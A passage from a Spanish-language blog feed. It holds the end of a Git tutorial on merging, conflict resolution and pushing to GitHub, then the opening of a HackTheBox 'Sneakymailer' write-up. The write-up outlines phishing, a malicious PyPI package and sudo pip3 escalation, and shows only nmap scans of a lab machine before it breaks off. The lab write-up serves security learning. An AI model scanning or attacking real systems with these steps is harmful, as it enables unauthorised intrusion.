  &lt;p&gt;Para fusionar dos &lt;code&gt;branch&lt;/code&gt; es muy importante estar en el &lt;code&gt;branch&lt;/code&gt; que recibira la fusión.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Para ello vamos a practicar lo anteriormente aprendido.&lt;/p&gt;

&lt;p&gt;Primero voy a dirigirme a el &lt;code&gt;branch&lt;/code&gt; principal &lt;code&gt;main&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git checkout main
Cambiado a rama 'main'
❯ git branch
* main
  primer-branch
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora crearemos un nuevo &lt;code&gt;branch&lt;/code&gt; y nos metemos en el&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git checkout -b segundo-branch
Cambiado a nueva rama 'segundo-branch'
❯ git branch
  main
  primer-branch
* segundo-branch
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vamos a modificar el archivo &lt;code&gt;archivo_git.txt&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat archivo_git.txt
Hola Git
Ahora estoy aprendiendo Git
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Continuamos verificado el estadoy vemos que fue modificado&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git status
En la rama segundo-branch
Cambios no rastreados para el commit:
  (usa &quot;git add &amp;lt;archivo&amp;gt;...&quot; para actualizar lo que será confirmado)
  (usa &quot;git restore &amp;lt;archivo&amp;gt;...&quot; para descartar los cambios en el directorio de trabajo)
	modificados:     archivo_git.txt

sin cambios agregados al commit (usa &quot;git add&quot; y/o &quot;git commit -a&quot;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Sigue agregarlo al area de preparación&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git add .
❯ git status
En la rama segundo-branch
Cambios a ser confirmados:
  (usa &quot;git restore --staged &amp;lt;archivo&amp;gt;...&quot; para sacar del área de stage)
	modificados:     archivo_git.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Creamos el &lt;code&gt;commit&lt;/code&gt; con &lt;code&gt;git commit&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Agregamos una segunda linea al archivo
# Por favor ingresa el mensaje del commit para tus cambios. Las
#  líneas que comiencen con '#' serán ignoradas, y un mensaje
#  vacío aborta el commit.
#
# En la rama segundo-branch
# Cambios a ser confirmados:
#	modificados:     archivo_git.txt
#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Guardamos y cerramos&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git commit
[segundo-branch 924f1c5] Agregamos una segunda linea al archivo
 1 file changed, 2 insertions(+), 1 deletion(-)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora volveremos a el &lt;code&gt;branch&lt;/code&gt; principal &lt;code&gt;main&lt;/code&gt; y vemos el antiguo contenido.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat archivo_git.txt
Este es mi segundo commit pero modificado
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Para poder realizar ahora el &lt;code&gt;merge&lt;/code&gt; o la fusión de &lt;code&gt;branch&lt;/code&gt;, despues de ya terminar de hacer todos nuestros cambios. Debemos estar en el &lt;code&gt;branch&lt;/code&gt; que recibira los cambios.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git branch
* main
  primer-branch
  segundo-branch
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y ahora procedemos a ejecutar el comando &lt;code&gt;git merge&lt;/code&gt; seguido de el nombre de la rama que queremos fusionar, en nuesto caso queremos fusionar el &lt;code&gt;branch&lt;/code&gt; recien creado &lt;code&gt;segundo-branch&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git merge segundo-branch
Actualizando 415796f..924f1c5
Fast-forward
 archivo_git.txt | 3 ++-
 1 file changed, 2 insertions(+), 1 deletion(-)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos el mensaje de que se estan combinando todos los &lt;code&gt;commits&lt;/code&gt; con el &lt;code&gt;branch&lt;/code&gt; principal&lt;/p&gt;

&lt;p&gt;Y ahora si leemos el archivo &lt;code&gt;archivo_git.txt&lt;/code&gt;, vemos que se combinaron ambos &lt;code&gt;branch&lt;/code&gt; :)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat archivo_git.txt
Hola Git
Ahora estoy aprendiendo Git
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;y si vemos el historial ahora ese &lt;code&gt;commit&lt;/code&gt; que hicimos al modificar el archivo en &lt;code&gt;segundo-branch&lt;/code&gt;, tambien es parte de &lt;code&gt;main&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git log --oneline
924f1c5 (HEAD -&amp;gt; main, segundo-branch) Agregamos una segunda linea al archivo
415796f Actualizar teto del segundo commit modificado
0143452 agregar mi archivo de texto
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;conflictos-en-merge-conflictos-al-fusionar-branchs&quot;&gt;Conflictos en Merge - Conflictos al fusionar Branchs &lt;a href=&quot;#conflictos-en-merge-conflictos-al-fusionar-branchs&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;

&lt;p&gt;Ya que realizamos antes el &lt;code&gt;merge&lt;/code&gt; de ambos &lt;code&gt;branch&lt;/code&gt;, no necesitamos ya el &lt;code&gt;branch&lt;/code&gt; que creamos &lt;code&gt;segundo-branch&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git branch
* main
  primer-branch
  segundo-branch
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Asi que podemos borrar este &lt;code&gt;branch&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git branch -d segundo-branch
Eliminada la rama segundo-branch (era 924f1c5).
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora los conflictos ocurren cuando tratamos de hacer un &lt;code&gt;merge&lt;/code&gt; de archivos que tienen cambios que tienen conflictos.&lt;/p&gt;

&lt;p&gt;Estos pueden ser: Modificar el mismo texto, Modificar la misma linea o elemento, esto &lt;code&gt;Git&lt;/code&gt; los considera incompatible.&lt;/p&gt;

&lt;p&gt;En estos casos tenemos que decidir como vamos a hacer el &lt;code&gt;merge&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Veamoslo a continuación:&lt;/p&gt;

&lt;p&gt;Vemos que el contenido del archivo en &lt;code&gt;primer-branch&lt;/code&gt; es&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git branch
  main
* primer-branch
❯ /bin/cat archivo_git.txt
Hola miGit
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;y ahora si vamos a &lt;code&gt;main&lt;/code&gt; y leemos el archivo&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git checkout main
Cambiado a rama 'main'
❯ /bin/cat archivo_git.txt
Hola Git
Ahora estoy aprendiendo Git
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Que pasa si intentamos hacer un &lt;code&gt;merge&lt;/code&gt; de ambos &lt;code&gt;branch&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git merge primer-branch
Auto-fusionando archivo_git.txt
CONFLICTO (contenido): Conflicto de fusión en archivo_git.txt
Fusión automática falló; arregle los conflictos y luego realice un commit con el resultado.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Al ejecutar el comando, nos dice que la combinación automatica falló y debemos arreglar los conflictos.&lt;/p&gt;

&lt;p&gt;Si vamos a nuestro editor de texto nos mostrara algo de este tipo&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt; HEAD
Hola Git
Ahora estoy aprendiendo Git
=======
Hola miGit
&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt; primer-branch
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;En este caso el editor de texto &lt;code&gt;Visual Studio Code&lt;/code&gt;, nos fascilita decidir cuando tenemos este tipo de conflictos. Asi que en estos casos es muy recomendable usarlo.&lt;/p&gt;

&lt;p&gt;Nos da las opciones:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code&gt;Accept Current Change&lt;/code&gt; : Aceptar el cambio actual “del branch main”&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;Accept Incoming Change&lt;/code&gt; : Aceptar el cambio entrante “del branch primer-branch”&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;Accept Both Change&lt;/code&gt; : Aceptar ambos cambios&lt;/li&gt;
  &lt;li&gt;&lt;code&gt;Compare changes&lt;/code&gt; : Comparar los cambios&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/code1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Esa decisión ya dependera del cambio que estes dispuesto a aceptar.&lt;/p&gt;

&lt;p&gt;En este caso usare la opción de aceptar ambos cambios.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/code2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Continuamos guardando y cerrando el editor y ejecutamos &lt;code&gt;git merge --continue&lt;/code&gt; para continuar el proceso de fusión, esto nos abrira el editor nuevamente con el mensaje que se asignara al &lt;code&gt;commit&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Merge branch 'primer-branch'

# Conflicts:
#	archivo_git.txt
#
# Parece que estás realizando una fusión.
# Si esto no es correcto, ejecuta
#	git update-ref -d MERGE_HEAD
# e intenta de nuevo.


# Por favor ingresa el mensaje del commit para tus cambios. Las
#  líneas que comiencen con '#' serán ignoradas, y un mensaje
#  vacío aborta el commit.
#
# En la rama main
# Todos los conflictos resueltos pero sigues fusionando.
#
# Cambios a ser confirmados:
#	modificados:     archivo_git.txt
#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Guardamos el archivo y cerramos para culminar el proceso&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git merge --continue
[main 95b5d86] Merge branch 'primer-branch'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pudimos solucionar el conflicto y nos hizo el &lt;code&gt;merge&lt;/code&gt; de manera exitosa, como vimos en este caso &lt;code&gt;visual studio code&lt;/code&gt; es muy útil para solucionar estos conflictos.&lt;/p&gt;

&lt;p&gt;Ahora finalmente leeremos el archivo otra vez&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ /bin/cat archivo_git.txt
Hola Git
Ahora estoy aprendiendo Git
Hola miGit
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y como resultado tenemos el archivo tal y cual lo combinamos.&lt;/p&gt;

&lt;h2 id=&quot;conexión-con-github&quot;&gt;Conexión con Github &lt;a href=&quot;#conexión-con-github&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Despues de haber trabajado todo nuestro codigo, llego la hora de subirlo a la nube. Vamos a hacer esto utilizando &lt;code&gt;GitHub&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Para ello lo primero que debemos hacer es crearnos una cuenta, lo cual es un proceso muy sencillo, podemos hacerlo usando dirigiendonos a este enlace:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/signup?return_to=https%3A%2F%2Fgithub.com%2Ftopics%2Flogin&amp;amp;source=login&quot;&gt;https://github.com/signup?return_to=https%3A%2F%2Fgithub.com%2Ftopics%2Flogin&amp;amp;source=login&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Una vez creada nuestra cuenta nos vamos a la sección de &lt;code&gt;Repositorios&lt;/code&gt; y le damos a &lt;code&gt;New&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/git1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora vamos a elegir un nombre para nuestro repositorio en este caso usaremos de nombre &lt;code&gt;mi-primer-repositorio&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/git2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lo siguiente sera dar click en &lt;code&gt;Create&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/git3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora nos dara una serie de opciones de que podemos hacer para subirlo aqui en &lt;code&gt;github&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/git4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nosotros usaremos el comando, &lt;code&gt;git remote add origin https://github.com/f1rtsmiracle/mi-primer-repositorio.git&lt;/code&gt;, en donde &lt;code&gt;git remote&lt;/code&gt; nos va a servir para indicar si es que vamos a tener un servidor remoto en el cual subir nuestros cambios y con &lt;code&gt;add origin&lt;/code&gt; le indicamos de donde nosotros tenemos que ir a obtener nuestro codigo y tambien a donde tenemos que subir los cambios realizados y finalmente la &lt;code&gt;url&lt;/code&gt; de donde se encuentra almacenado nuestro codigo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git remote add origin https://github.com/f1rtsmiracle/mi-primer-repositorio.git
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Finalmente usaremos el comando &lt;code&gt;git push&lt;/code&gt;, para subir nuestros cambios los cuales seran con respecto a el &lt;code&gt;branch&lt;/code&gt; con la que estemos trabajando, pero ya que &lt;code&gt;main&lt;/code&gt; no se encuentra creado en &lt;code&gt;github&lt;/code&gt; con &lt;code&gt;-u&lt;/code&gt; creamos el &lt;code&gt;branch&lt;/code&gt; y con &lt;code&gt;origin&lt;/code&gt; indicamos donde queremos que sea creado y finalmente el nombre del &lt;code&gt;branch&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git push -u origin main
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Despues de ejecutar el comando nos pedira ingresar el nombre de &lt;code&gt;usuario&lt;/code&gt; y el &lt;code&gt;password&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Procedemos a ingresar el &lt;code&gt;usuario&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git push -u origin main
Username for 'https://github.com': f1rtsmiracle
Password for 'https://f1rtsmiracle@github.com':
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Sim embargo en &lt;code&gt;password&lt;/code&gt; no debemos ingresar la contraseña con la que nos registramos a &lt;code&gt;github&lt;/code&gt;. Aqui nosotros debemos introducir una &lt;code&gt;key&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Para obtenerla nos dirigimos a la opción de nuestro perfil &lt;code&gt;settings&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/git5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Despues nos vamos a la opción &lt;code&gt;Developer Settings&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/git6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A continuación vamos a la opción &lt;code&gt;Personal Access Token&lt;/code&gt; -&amp;gt; &lt;code&gt;Tokens (classic)&lt;/code&gt; -&amp;gt; &lt;code&gt;Generate New Token&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/git8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ingresamos el nombre del token, establecemos un tiempo de expiración y marcamos la opción &lt;code&gt;repo&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/git9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finalmente damos click en la opción &lt;code&gt;Generate Token&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/git10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Estos nos mostrara nuestro &lt;code&gt;token&lt;/code&gt; creado el cual debemos copiarlo y ingresarlo en &lt;code&gt;Password&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/git11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;y vemos como todo nuestro codigo se subio a &lt;code&gt;github&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git push -u origin main
Username for 'https://github.com': f1rtsmiracle
Password for 'https://f1rtsmiracle@github.com': 
Enumerando objetos: 21, listo.
Contando objetos: 100% (21/21), listo.
Compresión delta usando hasta 4 hilos
Comprimiendo objetos: 100% (8/8), listo.
Escribiendo objetos: 100% (21/21), 1.73 KiB | 888.00 KiB/s, listo.
Total 21 (delta 1), reusados 0 (delta 0), pack-reusados 0
remote: Resolving deltas: 100% (1/1), done.
To https://github.com/f1rtsmiracle/mi-primer-repositorio.git
 * [new branch]      main -&amp;gt; main
Rama 'main' configurada para hacer seguimiento a la rama remota 'main' de 'origin'.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vamos a nuestro repositorio nuevamente y vemos los cambios.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/articles/2023-04-09-Git/git12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y cada vez que queramos seguir agregando nuevos cambios, lo vamos modificando con nuestro editor de texto preferido, luego nos vamos a la terminal y los agregamos con &lt;code&gt;git add&lt;/code&gt;. Creamos un &lt;code&gt;commit&lt;/code&gt; y finalmente usamos el comando de &lt;code&gt;git push&lt;/code&gt; y con ese vamos a agregar todos nuestros cambios.&lt;/p&gt;

&lt;p&gt;Ahora en caso que estemos creando un nuevo &lt;code&gt;branch&lt;/code&gt; y todavia no queremos hacerle un &lt;code&gt;merge&lt;/code&gt;, pero si queremos subirlo a &lt;code&gt;github&lt;/code&gt;, lo que tenemos que hacer es cambiar de &lt;code&gt;branch&lt;/code&gt; con el comando &lt;code&gt;git checkout nombre_branch&lt;/code&gt; y ejecutamos &lt;code&gt;git push -u nombre_rama&lt;/code&gt; y lo que hara es crear este &lt;code&gt;branch&lt;/code&gt; en el repositorio.&lt;/p&gt;

&lt;p&gt;Espero haberte ayudado, esto seria todo hasta la proxima!!! :)&lt;/p&gt;
</description>
        <pubDate>Mon, 10 Apr 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/articulos/Git</link>
        <guid isPermaLink="true">http://localhost:4000/articulos/Git</guid>
        
        <category>Git</category>
        
        <category>Repositorio</category>
        
        <category>Experto</category>
        
        <category>Gratis</category>
        
        <category>Domina</category>
        
        <category>Github</category>
        
        
        <category>articulos</category>
        
      </item>
    
      <item>
        <title>Maquina Sneakymailer - htb writeup</title>
        <description>&lt;p&gt;Hoy vamos a resolver una máquina &lt;code&gt;hackthebox&lt;/code&gt; de dificultad &lt;code&gt;media&lt;/code&gt;, la cual explotaremos a partir de información lekeada y realizando un ataque masivo de email, después migraremos a otro usuario abusando de un &lt;code&gt;pypi server&lt;/code&gt; creando un paquete malicioso y finalmente escalaremos privilegios como el usuario &lt;code&gt;root&lt;/code&gt; abusando de un privilegio de sudoers en &lt;code&gt;pip3&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Sneakymailer
❯ ls
 Sneakymailer
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap, content, scripts}
}
❯ mkt
❯ ls
 content   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;Enumeración &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeración, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.197
PING 10.10.10.197 (10.10.10.197) 56(84) bytes of data.
64 bytes from 10.10.10.197: icmp_seq=1 ttl=63 time=2582 ms

--- 10.10.10.197 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 2582.173/2582.173/2582.173/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde ahora procederemos a el scaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;allPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.197 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-08 21:19 GMT
Initiating SYN Stealth Scan at 21:19
Scanning 10.10.10.197 [65535 ports]
Discovered open port 80/tcp on 10.10.10.197
Discovered open port 22/tcp on 10.10.10.197
Discovered open port 21/tcp on 10.10.10.197
Discovered open port 25/tcp on 10.10.10.197
Discovered open port 8080/tcp on 10.10.10.197
Discovered open port 143/tcp on 10.10.10.197
Discovered open port 993/tcp on 10.10.10.197
Completed SYN Stealth Scan at 21:20, 20.33s elapsed (65535 total ports)
Nmap scan report for 10.10.10.197
Host is up, received user-set (0.31s latency).
Scanned at 2023-04-08 21:19:57 GMT for 20s
Not shown: 63699 closed tcp ports (reset), 1829 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON
21/tcp   open  ftp        syn-ack ttl 63
22/tcp   open  ssh        syn-ack ttl 63
25/tcp   open  smtp       syn-ack ttl 63
80/tcp   open  http       syn-ack ttl 63
143/tcp  open  imap       syn-ack ttl 63
993/tcp  open  imaps      syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 20.46 seconds
           Raw packets sent: 98589 (4.338MB) | Rcvd: 88844 (3.554MB)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p21,22,25,80,143,993,8080 10.10.10.197 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-04-08 21:21 GMT
Nmap scan report for 10.10.10.197
Host is up (0.40s latency).

PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 57:c9:00:35:36:56:e6:6f:f6:de:86:40:b2:ee:3e:fd (RSA)
|   256 d8:21:23:28:1d:b8:30:46:e2:67:2d:59:65:f0:0a:05 (ECDSA)
|_  256 5e:4f:23:4e:d4:90:8e:e9:5e:89:74:b3:19:0c:fc:1a (ED25519)
25/tcp   open  smtp     Postfix smtpd
|_smtp-commands: debian, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
80/tcp   open  http     nginx 1.14.2
|_http-title: Did not follow redirect to http://sneakycorp.htb
|_http-server-header: nginx/1.14.2
143/tcp  open  imap     Courier Imapd (released 2018)
|_imap-capabilities: THREAD=REFERENCES OK IDLE CHILDREN ACL2=UNION STARTTLS UIDPLUS SORT NAMESPACE ACL completed CAPABILITY QUOTA IMAP4rev1 UTF8=ACCEPTA0001 ENABLE THREAD=ORDEREDSUBJECT
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
993/tcp  open  ssl/imap Courier Imapd (released 2018)
|_imap-capabilities: THREAD=REFERENCES OK IDLE CHILDREN ACL2=UNION UIDPLUS SORT NAMESPACE ACL AUTH=PLAIN completed CAPABILITY QUOTA IMAP4rev1 UTF8=ACCEPTA0001 ENABLE THREAD=ORDEREDSUBJECT
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-05-14T17:14:21
|_Not valid after:  2021-05-14T17:14:21
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http     nginx 1.14.2
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.14.2
Service Info: Host:  debian; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 78.06 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Visulizamos información interesante de los puertos escaneados:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;21&lt;/td&gt;
      &lt;td&gt;FTP&lt;/td&gt;
      &lt;td&gt;vsftpd 3.0.3&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;SSH&lt;/td&gt;
      &lt;td&gt;OpenSSH 7.9p1&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;25&lt;/td&gt;
      &lt;td&gt;SMTP&lt;/td&gt;
      &lt;td&gt;Postfix smtpd&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
